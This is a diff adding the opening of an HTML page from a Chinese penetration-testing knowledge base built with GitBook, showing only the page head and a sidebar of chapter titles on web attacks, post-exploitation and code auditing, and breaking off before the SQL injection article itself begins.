@@ -1,0 +1,3749 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Sql注入详解--Mysql · Khaz's 知识库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Khaz">
+        
+        
+    
+    <link rel="stylesheet" href="../../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-pro-fixed/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-theme-d4t/style.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="Web安全之Mysql基础.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="header-inner">
+        <!-- LOGO -->
+        <a href="/"><div class="logo"></div></a>
+        <span class="title"></span>
+
+        <!-- Search -->
+        
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+
+        <!-- Nav -->
+        <ul class="header-nav">
+            
+        </ul>
+    </div>
+
+    <div class="book-summary">
+        <div class="sidebar-nav-space"></div>
+        
+        
+        <nav role="navigation">
+            
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../../">
+            
+                <a href="../../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    01.渗透测试
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" >
+            
+                <span>
+            
+                    
+                    01.信息收集
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../../01.信息收集/01.资产收集.html">
+            
+                <a href="../../../01.信息收集/01.资产收集.html">
+            
+                    
+                    01.资产收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../../01.信息收集/02.指纹识别.html">
+            
+                <a href="../../../01.信息收集/02.指纹识别.html">
+            
+                    
+                    02.指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../../01.信息收集/03.敏感信息收集.html">
+            
+                <a href="../../../01.信息收集/03.敏感信息收集.html">
+            
+                    
+                    03.敏感信息收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" >
+            
+                <span>
+            
+                    
+                    02.Web安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" >
+            
+                <span>
+            
+                    
+                    01.Sql注入
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.1" >
+            
+                <span>
+            
+                    
+                    Mysql
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.1.1" data-path="Web安全之Mysql基础.html">
+            
+                <a href="Web安全之Mysql基础.html">
+            
+                    
+                    Mysql基础操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.2.1.1.2" data-path="Web安全之Mysql注入.html">
+            
+                <a href="Web安全之Mysql注入.html">
+            
+                    
+                    Sql注入详解--Mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.2" >
+            
+                <span>
+            
+                    
+                    Sql Server
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.2.1" data-path="../SqlServer/Web安全之Sqlserver注入.html">
+            
+                <a href="../SqlServer/Web安全之Sqlserver注入.html">
+            
+                    
+                    Sql注入--MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.3" data-path="../配合其他.html">
+            
+                <a href="../配合其他.html">
+            
+                    
+                    配合其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" >
+            
+                <span>
+            
+                    
+                    02.文件操作
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.2.1" >
+            
+                <span>
+            
+                    
+                    文件上传
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.2.1.1" data-path="../../02.文件操作/文件上传/01.漏洞了解.html">
+            
+                <a href="../../02.文件操作/文件上传/01.漏洞了解.html">
+            
+                    
+                    01.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.2" data-path="../../02.文件操作/文件上传/02.黑名单绕过.html">
+            
+                <a href="../../02.文件操作/文件上传/02.黑名单绕过.html">
+            
+                    
+                    02.黑名单绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.3" data-path="../../02.文件操作/文件上传/03.白名单绕过.html">
+            
+                <a href="../../02.文件操作/文件上传/03.白名单绕过.html">
+            
+                    
+                    03.白名单绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.4" data-path="../../02.文件操作/文件上传/04.WebShell上传.html">
+            
+                <a href="../../02.文件操作/文件上传/04.WebShell上传.html">
+            
+                    
+                    04.WebShell上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.2" data-path="../../02.文件操作/文件包含.html">
+            
+                <a href="../../02.文件操作/文件包含.html">
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.3" data-path="../../02.文件操作/文件读取和下载.html">
+            
+                <a href="../../02.文件操作/文件读取和下载.html">
+            
+                    
+                    任意文件读取和下载
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.4" data-path="../../02.文件操作/文件预览.html">
+            
+                <a href="../../02.文件操作/文件预览.html">
+            
+                    
+                    文件预览
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" >
+            
+                <span>
+            
+                    
+                    03.命令注入
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.3.1" data-path="../../03.命令注入/01.漏洞了解.html">
+            
+                <a href="../../03.命令注入/01.漏洞了解.html">
+            
+                    
+                    01.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3.2" data-path="../../03.命令注入/02.漏洞利用.html">
+            
+                <a href="../../03.命令注入/02.漏洞利用.html">
+            
+                    
+                    02.漏洞利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3.3" data-path="../../03.命令注入/03.Dnslog.html">
+            
+                <a href="../../03.命令注入/03.Dnslog.html">
+            
+                    
+                    03.Dnslog
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4" >
+            
+                <span>
+            
+                    
+                    04.跨站脚本攻击
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.4.1" data-path="../../04.跨站脚本攻击/01.前置知识.html">
+            
+                <a href="../../04.跨站脚本攻击/01.前置知识.html">
+            
+                    
+                    01.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4.2" data-path="../../04.跨站脚本攻击/02.漏洞了解.html">
+            
+                <a href="../../04.跨站脚本攻击/02.漏洞了解.html">
+            
+                    
+                    02.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4.3" data-path="../../04.跨站脚本攻击/03.漏洞利用.html">
+            
+                <a href="../../04.跨站脚本攻击/03.漏洞利用.html">
+            
+                    
+                    03.漏洞利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5" >
+            
+                <span>
+            
+                    
+                    05.身份认证
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.5.1" data-path="../../05.身份认证/00.前置知识.html">
+            
+                <a href="../../05.身份认证/00.前置知识.html">
+            
+                    
+                    00.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.2" data-path="../../05.身份认证/01.登录框.html">
+            
+                <a href="../../05.身份认证/01.登录框.html">
+            
+                    
+                    01.登录框
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.3" data-path="../../05.身份认证/02.越权.html">
+            
+                <a href="../../05.身份认证/02.越权.html">
+            
+                    
+                    02.越权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.4" data-path="../../05.身份认证/03.JWT.html">
+            
+                <a href="../../05.身份认证/03.JWT.html">
+            
+                    
+                    JWT安全
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.5" data-path="../../05.身份认证/04.OAUTH.html">
+            
+                <a href="../../05.身份认证/04.OAUTH.html">
+            
+                    
+                    04.OAUTH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.6" data-path="../../05.身份认证/05.一些案例.html">
+            
+                <a href="../../05.身份认证/05.一些案例.html">
+            
+                    
+                    05.一些案例
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.6" >
+            
+                <span>
+            
+                    
+                    06.API接口测试
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.6.1" data-path="../../06.API接口测试/01.前置知识.html">
+            
+                <a href="../../06.API接口测试/01.前置知识.html">
+            
+                    
+                    01.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.6.2" data-path="../../06.API接口测试/03.Tips.html">
+            
+                <a href="../../06.API接口测试/03.Tips.html">
+            
+                    
+                    03.Tips
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.7" >
+            
+                <span>
+            
+                    
+                    07.SSRF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.7.1" data-path="../../07.SSRF/SSRF.html">
+            
+                <a href="../../07.SSRF/SSRF.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.8" >
+            
+                <span>
+            
+                    
+                    08.JSONP与CORS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.8.1" data-path="../../08.JSONP与CORS/CORS.html">
+            
+                <a href="../../08.JSONP与CORS/CORS.html">
+            
+                    
+                    CORS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.8.2" data-path="../../08.JSONP与CORS/JSONP跨域漏洞.html">
+            
+                <a href="../../08.JSONP与CORS/JSONP跨域漏洞.html">
+            
+                    
+                    JSONP跨域漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.9" >
+            
+                <span>
+            
+                    
+                    09.CSRF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.9.1" data-path="../../09.CSRF/CSRF.html">
+            
+                <a href="../../09.CSRF/CSRF.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.10" >
+            
+                <span>
+            
+                    
+                    10.XXE
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.10.1" data-path="../../10.XXE/XXE.html">
+            
+                <a href="../../10.XXE/XXE.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11" >
+            
+                <span>
+            
+                    
+                    11.逻辑漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.11.1" data-path="../../11.逻辑漏洞/01.短信验证码与图形验证码.html">
+            
+                <a href="../../11.逻辑漏洞/01.短信验证码与图形验证码.html">
+            
+                    
+                    01.短信验证码与图形验证码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.2" data-path="../../11.逻辑漏洞/02.任意用户密码重置.html">
+            
+                <a href="../../11.逻辑漏洞/02.任意用户密码重置.html">
+            
+                    
+                    02.任意用户密码重置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.3" data-path="../../11.逻辑漏洞/03.支付漏洞.html">
+            
+                <a href="../../11.逻辑漏洞/03.支付漏洞.html">
+            
+                    
+                    03.支付漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.4" data-path="../../11.逻辑漏洞/04.其他.html">
+            
+                <a href="../../11.逻辑漏洞/04.其他.html">
+            
+                    
+                    04.其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.12" >
+            
+                <span>
+            
+                    
+                    12.微信小程序
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.12.1" data-path="../../12.微信小程序/小程序与公众号.html">
+            
+                <a href="../../12.微信小程序/小程序与公众号.html">
+            
+                    
+                    小程序与公众号
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.13" >
+            
+                <span>
+            
+                    
+                    13.前端加密对抗
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.13.1" data-path="../../13.前端加密对抗/前端加密渗透.html">
+            
+                <a href="../../13.前端加密对抗/前端加密渗透.html">
+            
+                    
+                    前端加密渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.14" data-path="../../AI大模型.html">
+            
+                <a href="../../AI大模型.html">
+            
+                    
+                    AI大模型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.15" data-path="../../Waf绕过学习.html">
+            
+                <a href="../../Waf绕过学习.html">
+            
+                    
+                    WAF绕过学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.16" data-path="../../其他.html">
+            
+                <a href="../../其他.html">
+            
+                    
+                    其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" >
+            
+                <span>
+            
+                    
+                    03.云安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../../03.云安全/云安全.html">
+            
+                <a href="../../../03.云安全/云安全.html">
+            
+                    
+                    云安全
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    04.移动安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../../../04.移动安全/APP渗透.html">
+            
+                <a href="../../../04.移动安全/APP渗透.html">
+            
+                    
+                    APP渗透总结
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../../../04.移动安全/环境.html">
+            
+                <a href="../../../04.移动安全/环境.html">
+            
+                    
+                    环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" >
+            
+                <span>
+            
+                    
+                    05.漏洞复现
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../../05.漏洞复现/Mysql%20Client 任意文件读取攻击.md">
+            
+                <span>
+            
+                    
+                    Mysql Client 任意文件读取攻击复现
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../../05.漏洞复现/Redis漏洞.html">
+            
+                <a href="../../../05.漏洞复现/Redis漏洞.html">
+            
+                    
+                    Redis漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../../05.漏洞复现/shiro漏洞.html">
+            
+                <a href="../../../05.漏洞复现/shiro漏洞.html">
+            
+                    
+                    Shiro漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.4" data-path="../../../05.漏洞复现/spring漏洞复现.html">
+            
+                <a href="../../../05.漏洞复现/spring漏洞复现.html">
+            
+                    
+                    Spring框架漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.5" data-path="../../../05.漏洞复现/Tomcat.html">
+            
+                <a href="../../../05.漏洞复现/Tomcat.html">
+            
+                    
+                    Tomcat漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.6" data-path="../../../05.漏洞复现/Weblogic.html">
+            
+                <a href="../../../05.漏洞复现/Weblogic.html">
+            
+                    
+                    Weblogic漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.7" data-path="../../../05.漏洞复现/应用记录.html">
+            
+                <a href="../../../05.漏洞复现/应用记录.html">
+            
+                    
+                    渗透中常见应用记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.8" data-path="../../../05.漏洞复现/若依漏洞复现.html">
+            
+                <a href="../../../05.漏洞复现/若依漏洞复现.html">
+            
+                    
+                    若依漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    02.后渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../../../../02.后渗透/Linux/Linux渗透.html">
+            
+                <a href="../../../../02.后渗透/Linux/Linux渗透.html">
+            
+                    
+                    Linux渗透总结
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" >
+            
+                <span>
+            
+                    
+                    Windows域渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="../../../../02.后渗透/Windows域渗透/Windows内网渗透.html">
+            
+                <a href="../../../../02.后渗透/Windows域渗透/Windows内网渗透.html">
+            
+                    
+                    Windows内网渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="../../../../02.后渗透/Windows域渗透/入侵痕迹清理.html">
+            
+                <a href="../../../../02.后渗透/Windows域渗透/入侵痕迹清理.html">
+            
+                    
+                    入侵痕迹清理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3" data-path="../../../../02.后渗透/Windows域渗透/后渗透之了解.html">
+            
+                <a href="../../../../02.后渗透/Windows域渗透/后渗透之了解.html">
+            
+                    
+                    后渗透之了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4" data-path="../../../../02.后渗透/Windows域渗透/后渗透之基础知识.html">
+            
+                <a href="../../../../02.后渗透/Windows域渗透/后渗透之基础知识.html">
+            
+                    
+                    后渗透之基础知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.5" data-path="../../../../02.后渗透/Windows域渗透/后渗透之权限提升.html">
+            
+                <a href="../../../../02.后渗透/Windows域渗透/后渗透之权限提升.html">
+            
+                    
+                    后渗透之权限提升
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.6" data-path="../../../../02.后渗透/Windows域渗透/后渗透之权限维持.html">
+            
+                <a href="../../../../02.后渗透/Windows域渗透/后渗透之权限维持.html">
+            
+                    
+                    后渗透之权限维持
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" >
+            
+                <span>
+            
+                    
+                    社会工程学
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1" >
+            
+                <span>
+            
+                    
+                    近源
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1.1" data-path="../../../../02.后渗透/社会工程学/近源/BadUsb.html">
+            
+                <a href="../../../../02.后渗透/社会工程学/近源/BadUsb.html">
+            
+                    
+                    近源渗透之BadUSB
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.2" >
+            
+                <span>
+            
+                    
+                    钓鱼
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.2.1" data-path="../../../../02.后渗透/社会工程学/钓鱼/SPF伪造.html">
+            
+                <a href="../../../../02.后渗透/社会工程学/钓鱼/SPF伪造.html">
+            
+                    
+                    初探邮件钓鱼
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../../../../02.后渗透/隧道搭建.html">
+            
+                <a href="../../../../02.后渗透/隧道搭建.html">
+            
+                    
+                    端口转发与代理搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    03.代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" >
+            
+                <span>
+            
+                    
+                    .Net
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" data-path="../../../../03.代码审计/.Net/.net渗透.html">
+            
+                <a href="../../../../03.代码审计/.Net/.net渗透.html">
+            
+                    
+                    .net渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" >
+            
+                <span>
+            
+                    
+                    JAVA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" >
+            
+                <span>
+            
+                    
+                    01.基础知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.1" data-path="../../../../03.代码审计/JAVA/01.基础知识/Java反射.html">
+            
+                <a href="../../../../03.代码审计/JAVA/01.基础知识/Java反射.html">
+            
+                    
+                    Java反射
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2" data-path="../../../../03.代码审计/JAVA/01.基础知识/Java泛型.html">
+            
+                <a href="../../../../03.代码审计/JAVA/01.基础知识/Java泛型.html">
+            
+                    
+                    Java泛型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.3" data-path="../../../../03.代码审计/JAVA/01.基础知识/Java类加载器.html">
+            
+                <a href="../../../../03.代码审计/JAVA/01.基础知识/Java类加载器.html">
+            
+                    
+                    Java类加载器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.4" data-path="../../../../03.代码审计/JAVA/01.基础知识/SPI.html">
+            
+                <a href="../../../../03.代码审计/JAVA/01.基础知识/SPI.html">
+            
+                    
+                    SPI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2" >
+            
+                <span>
+            
+                    
+                    02.基础漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.2.1" data-path="../../../../03.代码审计/JAVA/02.基础漏洞/代码注入.html">
+            
+                <a href="../../../../03.代码审计/JAVA/02.基础漏洞/代码注入.html">
+            
+                    
+                    代码注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.2" data-path="../../../../03.代码审计/JAVA/02.基础漏洞/命令注入.html">
+            
+                <a href="../../../../03.代码审计/JAVA/02.基础漏洞/命令注入.html">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.3" data-path="../../../../03.代码审计/JAVA/02.基础漏洞/模板注入.html">
+            
+                <a href="../../../../03.代码审计/JAVA/02.基础漏洞/模板注入.html">
+            
+                    
+                    模板注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.4" data-path="../../../../03.代码审计/JAVA/02.基础漏洞/表达式注入.html">
+            
+                <a href="../../../../03.代码审计/JAVA/02.基础漏洞/表达式注入.html">
+            
+                    
+                    表达式注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3" >
+            
+                <span>
+            
+                    
+                    03.JavaWeb了解
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.3.1" data-path="../../../../03.代码审计/JAVA/03.JavaWeb了解/Spring.html">
+            
+                <a href="../../../../03.代码审计/JAVA/03.JavaWeb了解/Spring.html">
+            
+                    
+                    Spring
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.2" data-path="../../../../03.代码审计/JAVA/03.JavaWeb了解/Struts2.html">
+            
+                <a href="../../../../03.代码审计/JAVA/03.JavaWeb了解/Struts2.html">
+            
+                    
+                    Struts 2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.3" data-path="../../../../03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html">
+            
+                <a href="../../../../03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html">
+            
+                    
+                    Tomcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4" >
+            
+                <span>
+            
+                    
+                    04.反序列化
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.1" >
+            
+                <span>
+            
+                    
+                    CC链
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.1.1" data-path="../../../../03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html">
+            
